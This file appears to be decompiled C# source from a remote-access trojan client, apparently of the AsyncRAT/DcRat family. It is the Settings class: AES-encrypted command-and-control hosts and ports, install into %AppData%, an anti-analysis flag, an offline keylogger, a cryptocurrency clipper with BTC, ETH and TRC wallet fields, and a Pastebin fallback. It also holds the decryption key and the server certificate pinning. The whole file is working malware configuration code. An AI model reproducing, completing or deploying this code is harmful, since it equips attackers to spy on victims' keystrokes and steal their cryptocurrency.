using System;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using Client.Algorithm;
using Client.Helper;

namespace Client;

public static class Settings
{
	public static string Ports = "r7hU5MY/qekco2hCdM5llDq8aVwgfngPbyH6qQZv/swjzPx0IdcEO4Q9Hn7I7G/nnET2h5r1NDAnzL+QcwWJKg==";

	public static string Hosts = "n78wKF2IF1jA/dWQi+YaS3Dmkkx4a3ZGFhWZWd4FqZpMO3H8D/7uTZVIRaEnPPqnhN+6JLHrgowP4txax14ceRZY+RF3jb0pLvf6NZLhKvc=";

	public static string Version = "AdjZVFMvWlzgv8XfxMU4gnsAAISOO09SX/lk0V7nzL48fiD0M6mlri6bxNTYRJdt0CTkvE0R2W7AGoaaO6qxKA==";

	public static string Install = "vCX+voigO8aT9t9fcfNBvIiEz6WKPEk6bUWvgRtXMRjxGxLad/ojq0elxYnVRD8Sqyrl+s7H1jnHwXJhjyUcQg==";

	public static string InstallFolder = "%AppData%";

	public static string InstallFile = "";

	public static string Key = "emZxalh5OXBDY0VOeEJkMEUza25OanhIUHdrNmhtTm8=";

	public static string MTX = "eWJd7JWegMMMhVN13zw7NelT9OfI3ppZLFh0QIKXl29GJDGEkGYvHN1KqBUKusWhWqT03iH+mJDASvc8EqwbZw==";

	public static string Certificate = "nOx7+9CNr1DZY3K9B8o9oJhv10paox3sr8XbhNhu7uSKnhOzLxsFkDnh3LpfG2tMsTgKyiAbY9dQLCkcs84FLks1JEryucXHf/6Pt/p/cc28B4DlORZTZzN7M+ANi/G3bvlT+ZGYaA6H9J46dhRXRwc7/4kTan8lc6XRr5k6oIumd/VWeVu0vuLmGDiwJc8qTQnOWg1lxvhhzgxLq/aUnbJIBN9wQHMxL5M95cxXUhzj3ox6ZfChXRvN3UiN0pPiIGEe9mxQbmZAwxh92Z3uA2WHc+KcfFcDoxZ1wSzt8JOhXlzlUeJ2UAcnceI3tfnRly0m9EMaaLtoU5aqPc5k76zah85KEnORKooD3LvwIwz8jnFMZrsAkRblRpFj6Db7zgMmEcsiH6Hh9b0DBQLGtMcjACPTUpqHh8btwDBTwAaBm29JQ4ysfn31RcfdLj7XvJRDxZ2Fdcna5gviFm4YVfeR8jFvNahIvfj4V4OER2hz7kbIhlxhohb0x9mAyAFYc82Y7RVkqnHeyzQIomul+uZgxbB/cVyaEV2fyjLIiWzv9yj5swXuzTCUQyw97j0pSX/eOdJ08ROKlfqtxbg0cUB52lan7CMcd47V0nmz0kiy3vpt6qQkSq5QUdTKxWQnBykQoa19Ji9EFH+ZkzVJHLC3Tuv/6r7xuusUqHuHb5lJPac2iWIl9qxK8bskbasvq3wYjwDjQeyiIQ0aF5AWp+wBhF7f1hLqYiOJdEIj2EVUjxfVG0eYbF3PIlqTN1lQGh6tF67bWaTJ2b88OSAkIqCxHoVf9w+07WGKGgbnjVvylf2fs9ON0HXv71zq1grKm+7uSTbjn4AKOQyVyTsJt5aaaG1cr77aSPJogfQdx7omNHedh7hG/I9+G/hBtYOHwXA0/Mkg1zsd8eZlxLcHvJ+ngm0PuepjH2uMQpa2Q85KEm8AgnRb37AFrSkdWLIVdczsk+NmcUQPg35FjyzCEdJB93BtY/Y0l7r78hN43jC9aLKUMNBCVXQHWT51K9zKgMAm4D972iOUI+/bEslf9qGKDSaByQTe9FwWjXZFJSuxmxGpEAj3p4j9oZskYDpjzB+1kTf+NANqjY+qQ3kqlUtIX9nUu9q0J+c1s7nYJz7qPhwHdjFoXVGwPuJd1idm5s9GbXaP/GpWf8xIc96ZB8fhQukqM6c3Bbdpprw7/7p0h1e/zVrUH7LZXC06vCFjJpOSapCvrYbIMwXOQkvzZIkE0nnGXcVck3jAp/InXBkS2RyUovrNRfHL+LSl7Ux4499iOwOGOHygqlfnLhJUpwQwEs3yDBmMAwx5Fz8L7e1vh3OFTMoIEgzA7yHdeOBDUeU98qE+2buc2dF4ZPG0zZ2ecdxE38bFC4AxQ70nVfUgWyQXDUo1xy/UeY2LAa7Kid/xjTJxjBnb/yfBurONgu+RKKFlrPC1aUq/ajwftROzLJvHOkoUL0KD45NcJ+v/Rq/7rS5fICkEhLaWzCOdhua4pd+306SJGnoyt3uW/HFpfTygT8RhLu/A4pPiNmrkVUNAp5sXnEkZAoAVbl3d6TZBCekn7avZwuBMsUwKxsKJzvKjMK9eiqbDPwbuvocBQJYooMdJrLQyQmDd+CGQZaYn79dyQ519vCFXQjXi2mz5QaSbIFzdao/LycUyUJgZ+3gIpdTskydZ235TlD6LM6nrdun8k4AIt1LoRqzeqZPCy1rUFBcDU1W6fPivB7ieCFHeSVYime298RwqcX1QhGOYW+kPjQFYLeK9BhsoWDp8oGtw0qwEZaezu0V8GnanH517+8x96Gp+rqHMndxXv+u29x9I2qVErsCDaSzB9mPpAMH42rKpxf4Lo0syE3cI/eBn4jGuAmr/3nfjWnwsZyLuCCYD7zLT5G68nZIYf3UvKg4brIIMpjzrCGjyQ92qQ7cK9XFT47NiQT/4S0n0/UUg4udDwekBSYr5iKX22WMYWxoZ1CwqaOubSF8mqxkT7/YzXOsjC724giOKI+tiHmt9IxytCbz5Np5pmJlHj7ub+9tHpxt0EkkE6te9YQJZwogMj2RoO9froovPzquK1g2sOubQGghIJyJ+7xoluzbWOeGfsCFgz7+pyDrLrwgXtk4ZADYnkLzMmmoUJTd06zPJee8beIV6BuCDbkFouuRgeefU+irbfJSi//zNgkC7GnUQkFMz0DMWea3nJzu37yz1Ummtq/eVAAZj3gFu/iSJCa1mvVluZE1+LMEUdPeWzbrNZwMG5l5f/0Mlzd/i9OzCue/w3sgKt74e125UQ7stnxtLyVkZvzG0aaVCFRR6IJlOtze+1nDG1/4q0/X3CJZho0Weu+JcxsGqgvT/YKA=";

	public static string Serversignature = "vsA9U3WbCZe4UM+vXaYqvcaseB7+M+SAMlZnsNyd0BLFW2gMbGfsLLcmR8K7GQVF67HGcZiE7bdqi2k1Uf10R2FOSiRYrRU/VRRVc0o5uS8qPE14VcN5qXMWny8/3WTGl1WXSEyZpihdyl/mk3TClnS2tDYIiW0c97BaisRf243I7dnBWDN5tYIYyJ4Tbr0DUtNZLaBdeN6qsdWgp7rFXGZ7Hu6Sm4S4ATXbBvBghf5JTyyolTfrb2NlGE/MZnLuo0b8yWAh1iGPcLJfumVeiLF9PM2Oqhs8mM8mcFcdjMoiBEJmoLukFxXFyrkMzir1NuMA6RA4CAEquXg4rs3UytJxBVIk6tqew4LOHpguZh7gndPQaVBzJ0IcMDK/pVcb70G+wE7PFVAfTFXg2EQ4R5q3C++0EROjvV9Lpy96+vyPWsyGm4k+JfflVi0M1d75pSoxQq7Z0W1BmJ4gpIYKkM2/5t/ovixIkTXcZgQdztiUD68zoXqnfVR92z5JcSFNyeOJnSXSxCxGTrV2ywW3iwH/nQhtvSf7pi4KPb1ta6/TXHq/mYxfW34iXc/ymg6FBAAOE5hT76pQ//nKQ+Ma+T5B4ddUNrXqnU4hIKr87QY+TxYitGMBKhY1VrDuu4+J7g59csUV3ly0mbTk/xrviKE/zU6je/hRPoqoe7Rk7bFein1Lga8pKFj2jTZL2H3SYOB4VPED71hd9do90YUTQQScAY+BDa7z1oumwbMeWoBrvIU1ZMGkiagQGzII0+KXfBBZiLmRNenj6MMC2wSxF0aZnTIPGS/OqvJdjfoAq2288a+EjpfJkjJwT8+0hpgYl6dgepBr8aeZPKEKr3tqE5bXNgsk+TekeVVZjwhpd7T9adQfKVx0ZeTR8K+qEMq+k4wKm5wrkD774NXhAx17vWt6NFD/OtpQLosvlVrJxXAuJF5mZIqj9bpgDpPsx1VnkLLtoJPZLFDqIgKEQ2k93Q==";

	public static X509Certificate2 ServerCertificate;

	public static string Anti = "w5p+RTb89fNtz8fBEd2F+pwNlExE2lRA+7fOh9yTCCtRjKAImGNTUjMkbTcyUwylYc4si+xJslNR5wfw/bwMXQ==";

	public static string offlineKL = "cXdWe2ee2qC6mrn7esk/aDwO/LHzv1ZJFVL54sy+tzAYx9xNZDI6PBHYxiHt8KeAeYnN2xR6NcgiGdwoukYTcw==";

	public static string clipper = "igRO355cofL6p6spQ61661BHN98RlS7QyWqxFoBWLVWinbF5CpBtwEZQdRZz4XT4WGoZYecuS7S5eeiw7QFW0A==";

	public static string btc = "TYLtf0EOf6FZkQtbFjegvUnCUduvtGUPYB7wxhOoavHOQ+6t/jlwYDbD5/AUjQ22Tl/1ZLhDoZmic1pPJ9luRA==";

	public static string eth = "LLaLEr7NCeZdAYPDyBPIvgVrYRKLSw+YObOx69OWGoVPuldh9uku8//QXO1asPyj1otrgNn3r0jsJI0e5Xo2Eg==";

	public static string TRC = "tDba836dbmETqGnFkqww+PRa68e83e0LOQlu66ddXZK34j9E/eS2jmYGGZf4BV9H05SYSfyMDfMPLXXla5IMGw==";

	public static Aes256 aes256;

	public static string Pastebin = "3VH3pN0WrqxJda2LOS40+L+neUXKM/1IZnzOR3MbsCGI5rVlVqDogytU1EED9zLM59+Wv+2DZeinLA+oYdmNGQ==";

	public static string BDOS = "14BZy+O1GCrpwJspx9n4M2Sg2YGzarZ3FtHWkah10thbSXA1U7zuW82/wGazz3fJG/lAtpGqx0bMZZpJmKRBEg==";

	public static string Hwid = null;

	public static string Delay = "3";

	public static string Group = "JAU77zzcUBvc+Rq7Rt+7RH1kESyYogvqcG2TOaGHdYGRMGVpp1AZ6HBt8wOy4/1IjOn+rzwzotbqQJYfCOWbmw==";

	public static bool InitializeSettings()
	{
		try
		{
			Key = Encoding.UTF8.GetString(Convert.FromBase64String(Key));
			aes256 = new Aes256(Key);
			Ports = aes256.Decrypt(Ports);
			Hosts = aes256.Decrypt(Hosts);
			Version = aes256.Decrypt(Version);
			Install = aes256.Decrypt(Install);
			MTX = aes256.Decrypt(MTX);
			Pastebin = aes256.Decrypt(Pastebin);
			Anti = aes256.Decrypt(Anti);
			offlineKL = aes256.Decrypt(offlineKL);
			clipper = aes256.Decrypt(clipper);
			btc = aes256.Decrypt(btc);
			eth = aes256.Decrypt(eth);
			TRC = aes256.Decrypt(TRC);
			BDOS = aes256.Decrypt(BDOS);
			Group = aes256.Decrypt(Group);
			Hwid = HwidGen.HWID();
			Serversignature = aes256.Decrypt(Serversignature);
			ServerCertificate = new X509Certificate2(Convert.FromBase64String(aes256.Decrypt(Certificate)));
			return VerifyHash();
		}
		catch
		{
			return false;
		}
	}

	private static bool VerifyHash()
	{
		try
		{
			return ((RSACryptoServiceProvider)ServerCertificate.PublicKey.Key).VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(Key)), CryptoConfig.MapNameToOID("SHA256"), Convert.FromBase64String(Serversignature));
		}
		catch (Exception)
		{
			return false;
		}
	}
}
